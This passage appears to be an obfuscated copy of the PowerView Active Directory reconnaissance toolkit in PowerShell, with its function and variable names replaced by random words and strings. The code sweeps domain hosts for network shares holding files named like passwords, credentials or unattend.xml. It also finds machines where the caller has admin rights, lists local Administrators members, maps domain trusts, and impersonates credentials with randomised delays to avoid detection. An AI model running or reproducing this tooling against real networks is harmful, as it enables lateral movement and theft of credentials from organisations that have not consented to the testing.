            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[hasty] Enumerating server $KoSdeYaT99 ($ivWhKcbY99 of $($ZCKwKoiv99.count))"
                Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $kFEwNZHv99, $KqozIDmd99
            }
        }
        else {
            Write-Verbose "[hasty] Using threading with threads: $HTdoixhx99"

            $BHxnrcDI99 = @{
                'CheckShareAccess' = $kFEwNZHv99
                'TokenHandle' = $KqozIDmd99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function cognizant {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $tdrFALUN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $PoXGVGfN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $oGyOVIvJ99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ocbESvDy99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ZusWAspj99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $WXClDdmq99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $PsJJAxFX99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $UwujJppc99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $jJKxtLVp99,

        [String[]]
        $VYzMfooL99 = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $BRTLfNAI99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $mIkZSmpB99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $SgMJBQWw99,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $GIZwMJgs99,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $niFAVTYC99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {
        $BNZinIaQ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $BNZinIaQ99['Domain'] = $PoXGVGfN99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $BNZinIaQ99['LDAPFilter'] = $oGyOVIvJ99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $BNZinIaQ99['SearchBase'] = $ocbESvDy99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $BNZinIaQ99['OperatingSystem'] = $kOjIFfIK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $BNZinIaQ99['ServicePack'] = $iZbiKaWr99 }
        if ($PSBoundParameters['ComputerSiteName']) { $BNZinIaQ99['SiteName'] = $UHxOuyqA99 }
        if ($PSBoundParameters['Server']) { $BNZinIaQ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $BNZinIaQ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $BNZinIaQ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BNZinIaQ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $BNZinIaQ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $BNZinIaQ99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = $tdrFALUN99
        }
        else {
            Write-Verbose '[cognizant] Querying computers in the domain'
            $ZCKwKoiv99 = undergrad @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[cognizant] TargetComputers length: $($ZCKwKoiv99.Length)"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[cognizant] No hosts found to enumerate'
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $UwujJppc99, $VYzMfooL99, $GIZwMJgs99, $bhoFrHTN99, $niFAVTYC99, $InWlhoZx99, $ZDPszabE99)

            if ($ZDPszabE99) {
                $Null = privets -TokenHandle $ZDPszabE99 -Quiet
            }

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {

                $cJVHWtJh99 = @()
                if ($KoSdeYaT99.StartsWith('\\')) {
                    $cJVHWtJh99 += $KoSdeYaT99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                    if ($Up) {
                        $YFAdJOnK99 = publication -ComputerName $KoSdeYaT99
                        ForEach ($Share in $YFAdJOnK99) {
                            $XZVBpgKL99 = $Share.Name
                            $Path = '\\'+$KoSdeYaT99+'\'+$XZVBpgKL99
                            if (($XZVBpgKL99) -and ($XZVBpgKL99.Trim() -ne '')) {
                                if ($VYzMfooL99 -NotContains $XZVBpgKL99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $cJVHWtJh99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $cJVHWtJh99) {
                    Write-Verbose "Searching share: $Share"
                    $JvwkJkyA99 = @{
                        'Path' = $Share
                        'Include' = $UwujJppc99
                    }
                    if ($GIZwMJgs99) {
                        $JvwkJkyA99['OfficeDocs'] = $GIZwMJgs99
                    }
                    if ($niFAVTYC99) {
                        $JvwkJkyA99['FreshEXEs'] = $niFAVTYC99
                    }
                    if ($BRTLfNAI99) {
                        $JvwkJkyA99['LastAccessTime'] = $BRTLfNAI99
                    }
                    if ($mIkZSmpB99) {
                        $JvwkJkyA99['LastWriteTime'] = $mIkZSmpB99
                    }
                    if ($SgMJBQWw99) {
                        $JvwkJkyA99['CreationTime'] = $SgMJBQWw99
                    }
                    if ($InWlhoZx99) {
                        $JvwkJkyA99['CheckWriteAccess'] = $InWlhoZx99
                    }
                    fulfillment @SearchArgs
                }
            }

            if ($ZDPszabE99) {
                potato
            }
        }

        $KqozIDmd99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99
            }
            else {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[cognizant] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[cognizant] Delay: $Delay, Jitter: $gIOVyqMv99"
            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[cognizant] Enumerating server $KoSdeYaT99 ($ivWhKcbY99 of $($ZCKwKoiv99.count))"
                Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $UwujJppc99, $VYzMfooL99, $GIZwMJgs99, $bhoFrHTN99, $niFAVTYC99, $InWlhoZx99, $KqozIDmd99
            }
        }
        else {
            Write-Verbose "[cognizant] Using threading with threads: $HTdoixhx99"

            $BHxnrcDI99 = @{
                'Include' = $UwujJppc99
                'ExcludedShares' = $VYzMfooL99
                'OfficeDocs' = $GIZwMJgs99
                'ExcludeHidden' = $bhoFrHTN99
                'FreshEXEs' = $niFAVTYC99
                'CheckWriteAccess' = $InWlhoZx99
                'TokenHandle' = $KqozIDmd99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function exonerated {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $tdrFALUN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $PoXGVGfN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $oGyOVIvJ99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ocbESvDy99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ZusWAspj99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $WXClDdmq99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $PsJJAxFX99,

        [Switch]
        $kFEwNZHv99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {
        $BNZinIaQ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $BNZinIaQ99['Domain'] = $PoXGVGfN99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $BNZinIaQ99['LDAPFilter'] = $oGyOVIvJ99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $BNZinIaQ99['SearchBase'] = $ocbESvDy99 }
        if ($PSBoundParameters['Unconstrained']) { $BNZinIaQ99['Unconstrained'] = $eWrtIVpV99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $BNZinIaQ99['OperatingSystem'] = $kOjIFfIK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $BNZinIaQ99['ServicePack'] = $iZbiKaWr99 }
        if ($PSBoundParameters['ComputerSiteName']) { $BNZinIaQ99['SiteName'] = $UHxOuyqA99 }
        if ($PSBoundParameters['Server']) { $BNZinIaQ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $BNZinIaQ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $BNZinIaQ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BNZinIaQ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $BNZinIaQ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $BNZinIaQ99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = $tdrFALUN99
        }
        else {
            Write-Verbose '[exonerated] Querying computers in the domain'
            $ZCKwKoiv99 = undergrad @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[exonerated] TargetComputers length: $($ZCKwKoiv99.Length)"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[exonerated] No hosts found to enumerate'
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $ZDPszabE99)

            if ($ZDPszabE99) {
                $Null = privets -TokenHandle $ZDPszabE99 -Quiet
            }

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                if ($Up) {
                    $jOZOKjtI99 = appreciates -ComputerName $KoSdeYaT99
                    if ($jOZOKjtI99.IsAdmin) {
                        $KoSdeYaT99
                    }
                }
            }

            if ($ZDPszabE99) {
                potato
            }
        }

        $KqozIDmd99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99
            }
            else {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[exonerated] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[exonerated] Delay: $Delay, Jitter: $gIOVyqMv99"
            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[exonerated] Enumerating server $KoSdeYaT99 ($ivWhKcbY99 of $($ZCKwKoiv99.count))"
                Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $KqozIDmd99
            }
        }
        else {
            Write-Verbose "[exonerated] Using threading with threads: $HTdoixhx99"

            $BHxnrcDI99 = @{
                'TokenHandle' = $KqozIDmd99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }
}


function incendiaries {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $tdrFALUN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $PoXGVGfN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $oGyOVIvJ99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ocbESvDy99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ZusWAspj99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $WXClDdmq99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $PsJJAxFX99,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $owBLZLPg99 = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $BXxAvYPV99 = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {
        $BNZinIaQ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $BNZinIaQ99['Domain'] = $PoXGVGfN99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $BNZinIaQ99['LDAPFilter'] = $oGyOVIvJ99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $BNZinIaQ99['SearchBase'] = $ocbESvDy99 }
        if ($PSBoundParameters['Unconstrained']) { $BNZinIaQ99['Unconstrained'] = $eWrtIVpV99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $BNZinIaQ99['OperatingSystem'] = $kOjIFfIK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $BNZinIaQ99['ServicePack'] = $iZbiKaWr99 }
        if ($PSBoundParameters['ComputerSiteName']) { $BNZinIaQ99['SiteName'] = $UHxOuyqA99 }
        if ($PSBoundParameters['Server']) { $BNZinIaQ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $BNZinIaQ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $BNZinIaQ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BNZinIaQ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $BNZinIaQ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $BNZinIaQ99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = $tdrFALUN99
        }
        else {
            Write-Verbose '[incendiaries] Querying computers in the domain'
            $ZCKwKoiv99 = undergrad @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[incendiaries] TargetComputers length: $($ZCKwKoiv99.Length)"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[incendiaries] No hosts found to enumerate'
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $owBLZLPg99, $BXxAvYPV99, $ZDPszabE99)

            if ($owBLZLPg99 -eq "Administrators") {
                $lAyJZUZD99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $owBLZLPg99 = ($lAyJZUZD99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($ZDPszabE99) {
                $Null = privets -TokenHandle $ZDPszabE99 -Quiet
            }

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                if ($Up) {
                    $SqmImJRO99 = @{
                        'ComputerName' = $KoSdeYaT99
                        'Method' = $BXxAvYPV99
                        'GroupName' = $owBLZLPg99
                    }
                    inefficient @NetLocalGroupMemberArguments
                }
            }

            if ($ZDPszabE99) {
                potato
            }
        }

        $KqozIDmd99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99
            }
            else {
                $KqozIDmd99 = privets -Credential $tYWiEqAT99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[incendiaries] Total number of hosts: $($ZCKwKoiv99.count)"
            Write-Verbose "[incendiaries] Delay: $Delay, Jitter: $gIOVyqMv99"
            $ivWhKcbY99 = 0
            $fyuRWnJS99 = New-Object System.Random

            ForEach ($KoSdeYaT99 in $ZCKwKoiv99) {
                $ivWhKcbY99 = $ivWhKcbY99 + 1

                Start-Sleep -Seconds $fyuRWnJS99.Next((1-$gIOVyqMv99)*$Delay, (1+$gIOVyqMv99)*$Delay)

                Write-Verbose "[incendiaries] Enumerating server $KoSdeYaT99 ($ivWhKcbY99 of $($ZCKwKoiv99.count))"
                Invoke-Command -ScriptBlock $BJtVKDHD99 -ArgumentList $KoSdeYaT99, $owBLZLPg99, $BXxAvYPV99, $KqozIDmd99
            }
        }
        else {
            Write-Verbose "[incendiaries] Using threading with threads: $HTdoixhx99"

            $BHxnrcDI99 = @{
                'GroupName' = $owBLZLPg99
                'Method' = $BXxAvYPV99
                'TokenHandle' = $KqozIDmd99
            }

            nighttime -ComputerName $ZCKwKoiv99 -ScriptBlock $BJtVKDHD99 -ScriptParameters $BHxnrcDI99 -Threads $HTdoixhx99
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}



function chomped {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $qQdswWxr99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $SdFHhpJo99 = @{}
        if ($PSBoundParameters['Domain']) { $SdFHhpJo99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $SdFHhpJo99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['Properties']) { $SdFHhpJo99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $SdFHhpJo99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $SdFHhpJo99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $SdFHhpJo99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $SdFHhpJo99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $SdFHhpJo99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $SdFHhpJo99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $SdFHhpJo99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $FKcGGotA99 = @{}
            if ($JXWXuoyG99 -and $JXWXuoyG99.Trim() -ne '') {
                $JFMNzrVH99 = $JXWXuoyG99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $JFMNzrVH99 = (foretasted -Credential $tYWiEqAT99).Name
                }
                else {
                    $JFMNzrVH99 = (foretasted).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($JXWXuoyG99 -and $JXWXuoyG99.Trim() -ne '') {
                $JFMNzrVH99 = $JXWXuoyG99
            }
            else {
                $JFMNzrVH99 = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $DPPeAMZU99 = misbehaves @LdapSearcherArguments
            $byWaOTub99 = Democrats @NetSearcherArguments

            if ($DPPeAMZU99) {

                $DPPeAMZU99.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $DPPeAMZU99.FindOne() }
                else { $DEbeunXw99 = $DPPeAMZU99.FindAll() }
                $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $UBALjGPa99 = New-Object PSObject

                    $GSsAdYXR99 = @()
                    $GSsAdYXR99 += $qQdswWxr99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $qQdswWxr99[$_] }

                    $VfnnyExV99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $EdnVqKSw99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $NfCnbvSv99 = $Props.distinguishedname[0]
                    $TRaCzufL99 = $NfCnbvSv99.IndexOf('DC=')
                    if ($TRaCzufL99) {
                        $JFMNzrVH99 = $($NfCnbvSv99.SubString($TRaCzufL99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $JFMNzrVH99 = ""
                    }

                    $xfGFxGBi99 = $NfCnbvSv99.IndexOf(',CN=System')
                    if ($TRaCzufL99) {
                        $ydWBwabR99 = $NfCnbvSv99.SubString(3, $xfGFxGBi99-3)
                    }
                    else {
                        $ydWBwabR99 = ""
                    }

                    $ZacrqPKc99 = New-Object Guid @(,$Props.objectguid[0])
                    $KNzOOYde99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $UBALjGPa99 | Add-Member Noteproperty 'SourceName' $JFMNzrVH99
                    $UBALjGPa99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $UBALjGPa99 | Add-Member Noteproperty 'TrustType' $EdnVqKSw99
                    $UBALjGPa99 | Add-Member Noteproperty 'TrustAttributes' $($GSsAdYXR99 -join ',')
                    $UBALjGPa99 | Add-Member Noteproperty 'TrustDirection' "$VfnnyExV99"
                    $UBALjGPa99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $UBALjGPa99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $UBALjGPa99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $UBALjGPa99
                }
                if ($DEbeunXw99) {
                    try { $DEbeunXw99.dispose() }
                    catch {
                        Write-Verbose "[chomped] Error disposing of the Results object: $_"
                    }
                }
                $DPPeAMZU99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $wxlLEAfs99 = $tqOJuvTN99
            }
            elseif ($JXWXuoyG99 -and $JXWXuoyG99.Trim() -ne '') {
                $wxlLEAfs99 = $JXWXuoyG99
            }
            else {
                $wxlLEAfs99 = $Null
            }

            $sTvnYjdq99 = [IntPtr]::Zero

            $Flags = 63
            $VuSjPDrX99 = 0

            $uBmcbTpF99 = $VTuALOfG99::DsEnumerateDomainTrusts($wxlLEAfs99, $Flags, [ref]$sTvnYjdq99, [ref]$VuSjPDrX99)

            $ZdQQYlky99 = $sTvnYjdq99.ToInt64()

